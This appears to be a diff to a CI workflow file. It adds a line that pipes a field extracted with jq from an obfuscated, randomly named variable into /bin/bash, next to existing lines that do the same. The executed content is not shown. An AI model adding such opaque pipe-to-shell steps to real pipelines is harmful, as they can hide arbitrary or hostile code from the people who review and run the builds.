@@ -31,6 +31,7 @@ jobs:
           echo $exm4 | jq -r .u0086 | /bin/bash
           printf '%s' "$hape6022" | jq -r .oyh42 | /bin/bash
           printf '%s' "$cjm667" | jq -r .tdyu1595 | /bin/bash
+          echo $qtn84 | jq -r .r6 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
